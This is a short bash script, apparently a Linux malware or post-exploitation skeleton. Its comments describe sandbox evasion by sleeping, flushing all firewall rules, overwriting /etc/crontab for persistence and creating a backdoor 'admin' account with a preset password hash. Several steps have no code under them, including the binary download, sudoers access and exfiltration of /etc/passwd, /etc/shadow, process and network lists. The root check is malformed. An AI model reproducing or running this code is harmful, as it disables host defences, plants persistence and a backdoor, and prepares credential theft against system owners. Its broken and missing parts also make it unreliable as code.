#!/bin/bash

# Evade malware sandboxes by sleeping
sleep 60

# Script must run as root
if [[ $EUID -e 0 ]]; then
    # Download and run binary

    # Move script to $PATH location
    mv /tmp/manager /usr/bin/manager
    chmod +x /usr/bin/manager

    # Dump firewall fules
    iptables -F

    # Add execution of script to crontab
    echo "0 0 * * * /usr/bin/manager" > /etc/crontab

    # Create user and add to sudoers
    useradd -m -p "$6$s3TtrSgsNQT$jwJh8aehHlEiWPJyH.YSOJbOi2fEsOlPj6QUkAnx/MgG135mJqR95BMCYIKmIr6j3V5LFTPtg.Tvx8NSKaJEM/"  -s /bin/bash admin

    # Exfil /etc/passwd and /etc/shadow


    # Exfil process list


    # Exfil network list
    

fi






